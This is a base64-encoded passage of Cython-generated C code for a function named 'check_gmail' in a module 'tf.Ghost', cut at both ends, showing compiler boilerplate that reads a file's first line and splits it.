X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNiwgJl9fcHl4X3RfMTIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDIyX2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF82LCBfX3B5eF90XzEyLCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEsIE5VTEwpOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE3KTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgICAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfNCA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDIyX2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19weXhfdF8xOCA9ICghX19weXhfdF80KTsKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTgpKSB7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xMik7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfNiwgX19weXhfdF8xMiwgX19weXhfdF81KTsKICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSAwOyAgX19weXhfdF8xMiA9IDA7ICBfX3B5eF90XzUgPSAwOyAKICAgICAgICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgICAgICAgZ290byBfX3B5eF9MMjFfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yOjsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgICAgZ290byBfX3B5eF9MMTBfZXJyb3I7CiAgICAgICAgICAgICAgICBfX3B5eF9MMjFfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xNCwgX19weXhfdF8xNSwgX19weXhfdF8xNik7CiAgICAgICAgICAgICAgICBfX3B5eF9MMjVfdHJ5X2VuZDo7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTApIHsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0sIE5VTEwpOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMTBfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDE5OwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX3B5eF9MMTk6OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gX19weXhfTDI5OwogICAgICAgICAgICBfX3B5eF9MMTZfZXJyb3I6OwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wxMF9lcnJvcjsKICAgICAgICAgICAgX19weXhfTDI5OjsKICAgICAgICAgIH0KCiAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgZ290byBfX3B5eF9MMTVfdHJ5X2VuZDsKICAgICAgICBfX3B5eF9MMTBfZXJyb3I6OwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CgogICAgICAgIAogICAgICAgICB7CiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzEyLCAmX19weXhfdF82KSA8IDApIF9fUFlYX0VSUigwLCAxMzUsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwoKICAgICAgICAgIAogICAgICAgICAgIHsKICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfYnVpbHRpbl9vcGVuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs1XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTM2LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICAgIF9fcHl4X3RfMjAgPSBOVUxMOwogICAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMTM2LCBfX3B5eF9MMzJfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTsKICAgICAgICAgICAgX19weXhfdF8xMyA9IDE7CiAgICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzIxKSkpIHsKICAgICAgICAgICAgICBfX3B5eF90XzIwID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8yMSk7CiAgICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMjApOwogICAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8yMSk7CiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8yMSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgICAgfQogICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgewogICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIwLCBOVUxMfTsKICAgICAgICAgICAgICBfX3B5eF90XzE5ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0wzMl9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19weXhfdF8yMSA9IF9fcHl4X3RfMTk7CiAgICAgICAgICAgIF9fcHl4X3RfMTkgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgewogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMTYsICZfX3B5eF90XzE1LCAmX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2YsIF9fcHl4X3RfMjEpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzIxID0gMDsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBfX3B5eF90XzIwID0gX19weXhfdl9mOwogICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yMCk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMjAsIE5VTEx9OwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVhZCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMTM3LCBfX3B5eF9MMzhfZXJyb3IpCiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX3B5eF90XzE5OwogICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIE5VTEx9OwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMjEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXRsaW5lcywgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAxMzcsIF9fcHl4X0wzOF9lcnJvcikKICAgICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF8yMSwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAxMzcsIF9fcHl4X0wzOF9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X28sIF9fcHl4X3RfMTkpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzE5ID0gMDsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICAgICAgZ290byBfX3B5eF9MNDVfdHJ5X2VuZDsKICAgICAgICAgICAgICAgIF9fcHl4X0wzOF9lcnJvcjo7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuY2hlY2tfZ21haWwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICAgICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xOSwgJl9fcHl4X3RfMjEsICZfX3B5eF90XzExKSA8IDApIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0w0MF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8xOSwgX19weXhfdF8yMSwgX19weXhfdF8xMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yMCkpIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0w0MF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIwKTsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMCwgX19weXhfdF8yMCwgTlVMTCk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0w0MF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE3KTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgICAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTggPCAoMCkpIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0w0MF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9ICghX19weXhfdF8xOCk7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzQpKSB7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzE5KTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMjEpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF8xOSwgX19weXhfdF8yMSwgX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8xOSA9IDA7ICBfX3B5eF90XzIxID0gMDsgIF9fcHl4X3RfMTEgPSAwOyAKICAgICAgICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMTM2LCBfX3B5eF9MNDBfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwOwogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDM5X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19weXhfTDQwX2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE2LCBfX3B5eF90XzE1LCBfX3B5eF90XzE0KTsKICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDEyX2V4Y2VwdF9lcnJvcjsKICAgICAgICAgICAgICAgIF9fcHl4X0wzOV9leGNlcHRpb25faGFuZGxlZDo7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE2LCBfX3B5eF90XzE1LCBfX3B5eF90XzE0KTsKICAgICAgICAgICAgICAgIF9fcHl4X0w0NV90cnlfZW5kOjsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgIHsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoX19weXhfdF8xMCkgewogICAgICAgICAgICAgICAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDM3OwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX3B5eF9MMzc6OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gX19weXhfTDQ5OwogICAgICAgICAgICBfX3B5eF9MMzJfZXJyb3I6OwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wxMl9leGNlcHRfZXJyb3I7CiAgICAgICAgICAgIF9fcHl4X0w0OTo7CiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDExX2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgIH0KCiAgICAgICAgCiAgICAgICAgX19weXhfTDEyX2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7CiAgICAgICAgZ290byBfX3B5eF9MM19lcnJvcjsKICAgICAgICBfX3B5eF9MMTFfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpOwogICAgICAgIF9fcHl4X0wxNV90cnlfZW5kOjsKICAgICAgfQoKICAgICAgCiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdl9vKSkgeyBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKCJvIik7IF9fUFlYX0VSUigwLCAxMzksIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIF9fcHl4X3RfMTIgPSBfX3B5eF92X287CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEyKTsKICAgICAgX19weXhfdF8xMyA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNX07CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQV